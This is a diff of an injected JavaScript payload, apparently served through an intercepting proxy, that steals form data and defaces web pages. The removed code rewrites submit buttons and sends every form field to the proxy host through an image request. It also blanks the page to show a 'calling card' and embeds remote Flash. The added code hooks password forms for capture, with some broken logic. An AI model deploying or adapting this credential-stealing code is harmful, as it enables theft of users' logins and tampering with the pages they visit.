@@ -1,129 +1,56 @@
 var httpServer="http://proxyIpAddr:httpPort"
 
-function init_captive_js()
+function initialize()
 {
-//	capture_submitted_form_data();
-		display_calling_card();
-	//insert_flash("bbmap.swf");
-}
-
-var forms;
-var debug="";
-
-// Searches for submit buttons, & intercept data.
-function capture_submitted_form_data()
-{
-	forms = document.getElementsByTagName("form");
-
-	for (var x = 0; x < forms.length; x++)
-	{
-		if (debug == "debug")
-		{
-			alert("Form action: " + forms[x].action);
-		}
-
-		var inputBoxes = forms[x].getElementsByTagName("input");
-
-		var parentElement = forms[x];
-
-		for (var i = 0; i < inputBoxes.length; i++)
-		{
-			if (inputBoxes[i].type == "submit")
-			{
-				if (debug=="debug")
-				{
-					alert("Changing " + inputBoxes[i].value);
-				}
-				inputBoxes[i].type="button";
-				inputBoxes[i].setAttribute("onclick", "submitOverride(" + x + "," + i + ")");
-			}	
-		}
-	}	
-}
-
-function submitOverride(idx, buttonIdx)
-{
-var inputBoxes = forms[idx].getElementsByTagName("input");
-var urlString = "location=" + document.location + "&";
-
-inputBoxes[buttonIdx].type="submit";
-
-for (var i = 0; i < inputBoxes.length; i++)
-{
-urlString += inputBoxes[i].name + "="  + inputBoxes[i].value;
-if (i != inputBoxes.length - 1)
-urlString += "&";
-}
-
-var url = httpServer + "/images/image.jpg?" + urlString;
-myImage = new Image();
-myImage.src = url;
-
-//alert(url);
-
-forms[idx].submit();
+	//display_calling_card();
+	form_steal();
 }
 
 function display_calling_card()
 {
-var body = get_body_tag();
+	var body = $$('body')[0];
+	var calling_card = httpServer + "/images/calling_card.jpg";
+	
+	var img = new Element("img",
+		{
+			'src': calling_card
+		}
+	);
+	body.update(img);
+}
 
-var ccUrl = httpServer + "/images/ccard.gif";
-
-if (body.hasChildNodes())
+function form_steal()
 {
-while (body.childNodes.length >= 1)
+	var forms = $$('form');
+	for (i=0; i<forms.length; i++)
+	{		
+		var formElements = Form.getElements(forms[i]);
+		
+		for (j=0; j<formElements.length; j++)
+		{
+			if (formElements[j].type == "password")
+			{
+				if (forms[i].id = "")
+					forms[i].id = "form" + j;
+
+				Event.observe(forms[i].id, "submit", steal_form_data(forms[i]));
+			}
+		}
+	}
+}
+
+function steal_form_data(form)
 {
-body.removeChild(body.firstChild);
+	alert(Form.serialize(form));
 }
 
-var image = document.createElement("img");
-image.src = ccUrl;
-body.appendChild(image);
-}
-
-}
-
-function insert_flash(flash_object)
+function flash_inject()
 {
-var flash_url = httpServer + "/flash/" + flash_object;
-
-var objectTag = document.createElement("object");
-objectTag.setAttribute("type", "application/x-shockwave-flash");
-objectTag.setAttribute("data", flash_url);
-objectTag.setAttribute("width", 500);
-objectTag.setAttribute("height", 500);
-
-var param1Tag = document.createElement("param");
-param1Tag.setAttribute("movie", flash_url);
-
-var param2Tag = document.createElement("param");
-param2Tag.setAttribute("loop", "false");
-
-objectTag.appendChild(param1Tag);
-objectTag.appendChild(param2Tag);
-
-var body = get_body_tag();
-body.appendChild(objectTag);
+		var flash_applet = httpServer + "/flash/flash.swf";		
 }
 
-function get_body_tag()
+function break_fixit()
 {
-var body = document.getElementsByTagName("body");
-return body[0];
 }
 
-var browserName=navigator.appName;
-
-if (browserName=="Microsoft Internet Explorer")
-{
-window.onload=init_captive_js; 
-}
-else
-{
-if (document.addEventListener)
-{
-document.addEventListener("DOMContentLoaded", init_captive_js, false);
-}
-}
-
+Event.observe(window, "load", function() { initialize(); });
